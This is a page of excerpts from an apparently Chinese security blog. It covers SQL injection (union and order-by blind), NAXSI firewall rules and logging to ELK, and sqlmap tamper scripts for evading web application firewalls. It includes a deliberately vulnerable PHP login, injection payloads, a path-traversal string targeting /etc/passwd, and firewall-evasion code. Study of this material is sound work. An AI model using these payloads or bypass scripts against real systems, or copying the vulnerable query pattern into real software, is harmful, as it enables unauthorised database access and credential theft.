mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	
	</div>
  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/23/order-by-blind.html" >基于order by的盲注</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $dbhost &#x3D; &quot;172.19.0.2&quot;;
  $dbuser &#x3D; &quot;root&quot;;
  $dbpass &#x3D; &quot;root&quot;;
  $db &#x3D; &quot;vul&quot;;
  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
  mysqli_set_charset($conn,&quot;utf8&quot;);
 
  &#x2F;* sql
 
     create  table &#96;admin&#96; (
        &#96;id&#96; int(10) not null primary key auto_increment,
        &#96;username&#96; varchar(20) not null ,
        &#96;password&#96; varchar(32) not null
     );
  *&#x2F;
function   filter($str)&#123;
      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
      if(preg_match($filterlist,strtolower($str)))&#123;
        die(&quot;illegal input!&quot;);
      &#125;
      return $str;
  &#125;
$username &#x3D; isset($_POST[&#39;username&#39;])?
filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
$password &#x3D; isset($_POST[&#39;password&#39;])?
filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
$sql &#x3D; &quot;select * from admin where  username &#x3D;
 &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
 
$res &#x3D; $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0)&#123;
  $row &#x3D; $res -&gt; fetch_assoc();
  if($row[&#39;id&#39;])&#123;
     echo $row[&#39;username&#39;];
  &#125;
&#125;else&#123;
   echo &quot;The content in the password column is the &quot;;
&#125;
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
<p><img src="/2017/11/23/order-by-blind/2.png"></p>
<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
select * from admin where username&#x3D;&#39;&#39;&#x2F;2
select * from admin where username&#x3D;&#39;&#39;^1^1
select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后是基于order by的盲注：</p>
<p>首先是基本知识:</p>
	

	</div>
  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $dbhost &#x3D; &quot;172.19.0.2&quot;;
  $dbuser &#x3D; &quot;root&quot;;
  $dbpass &#x3D; &quot;root&quot;;
  $db &#x3D; &quot;vul&quot;;
  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
  mysqli_set_charset($conn,&quot;utf8&quot;);
 
  &#x2F;* sql
 
     create  table &#96;admin&#96; (
        &#96;id&#96; int(10) not null primary key auto_increment,
        &#96;username&#96; varchar(20) not null ,
        &#96;password&#96; varchar(32) not null
     );
  *&#x2F;
function   filter($str)&#123;
      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
      if(preg_match($filterlist,strtolower($str)))&#123;
        die(&quot;illegal input!&quot;);
      &#125;
      return $str;
  &#125;
$username &#x3D; isset($_POST[&#39;username&#39;])?
filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
$password &#x3D; isset($_POST[&#39;password&#39;])?
filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
$sql &#x3D; &quot;select * from admin where  username &#x3D;
 &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
 
$res &#x3D; $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0)&#123;
  $row &#x3D; $res -&gt; fetch_assoc();
  if($row[&#39;id&#39;])&#123;
     echo $row[&#39;username&#39;];
  &#125;
&#125;else&#123;
   echo &quot;The content in the password column is the &quot;;
&#125;
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
<p><img src="/2017/11/23/order-by-blind/2.png"></p>
<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
select * from admin where username&#x3D;&#39;&#39;&#x2F;2
select * from admin where username&#x3D;&#39;&#39;^1^1
select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后是基于order by的盲注：</p>
<p>首先是基本知识:</p>
	
	</div>
  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/02/naxsi.html" >naxsi的规则</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>MainRule: 定义检测的规则和分数</li>
<li>BasicRule: 定义MainRule的白名单</li>
<li>CheckRule: 定义当分值达到阈值采取的动作</li>
</ul>
<h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>Checkrules指令有四种动作：</p>
<pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>何时执行这四种动作？根据制定的得分(score)</p>
<p>####Basic Usage</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果<code>$SQL</code>大于等于8，则<code>BLOCK</code>掉这个请求。（前提是打开防火墙的过滤模式，而不是learning模式）</p>
<p>####Other Usages<br>看看另外的一种用法，白名单和黑名单一起用的时候，比如有这样的规则:</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;
CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/11/02/naxsi.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>MainRule: 定义检测的规则和分数</li>
<li>BasicRule: 定义MainRule的白名单</li>
<li>CheckRule: 定义当分值达到阈值采取的动作</li>
</ul>
<h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>Checkrules指令有四种动作：</p>
<pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>何时执行这四种动作？根据制定的得分(score)</p>
<p>####Basic Usage</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果<code>$SQL</code>大于等于8，则<code>BLOCK</code>掉这个请求。（前提是打开防火墙的过滤模式，而不是learning模式）</p>
<p>####Other Usages<br>看看另外的一种用法，白名单和黑名单一起用的时候，比如有这样的规则:</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;
CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/11/02/naxsi.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/10/30/bypass-sql-firewall.html" >bypass firewall</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-10-30  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>狗的绕过比较简单，还是写一下：</p>
<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;doc&#x2F;COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
    &quot;&quot;&quot;

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; &quot;&quot;
        quote, doublequote, firstspace &#x3D; False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace &#x3D; True
                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                    continue

            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
                quote &#x3D; not quote

            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
                doublequote &#x3D; not doublequote

            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                continue

            retVal +&#x3D; payload[i]

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ &#x3D; PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL &lt; 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html

    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
    &quot;&quot;&quot;

    def process(match):
        word &#x3D; match.group(&#39;word&#39;)
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
        else:
            return match.group()

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
</blockquote>
<p>比如mysql版本是5.5.53:</p>
<blockquote>
<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
</blockquote>
<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
	

	</div>
  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>狗的绕过比较简单，还是写一下：</p>
<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;doc&#x2F;COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ &#x3D; PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
    &quot;&quot;&quot;

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; &quot;&quot;
        quote, doublequote, firstspace &#x3D; False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace &#x3D; True
                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                    continue

            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
                quote &#x3D; not quote

            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
                doublequote &#x3D; not doublequote

            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
                continue

            retVal +&#x3D; payload[i]

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

&quot;&quot;&quot;
Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ &#x3D; PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL &lt; 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html

    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
    &quot;&quot;&quot;

    def process(match):
        word &#x3D; match.group(&#39;word&#39;)
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
        else:
            return match.group()

    retVal &#x3D; payload

    if payload:
        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)

    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
</blockquote>
<p>比如mysql版本是5.5.53:</p>
<blockquote>
<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
</blockquote>
<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
	
	</div>
  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/10/25/naxsi-elk.html" >NAXSI和ELK</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-10-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>NAXSI防火墙介绍: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p>
<p>过滤XSS，SQL注入，文件上传，文件遍历</p>
<p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p>
<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
logstash&gt; cd pattern
logstash&gt; vim naxsi
DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
LEVEL (\w+)
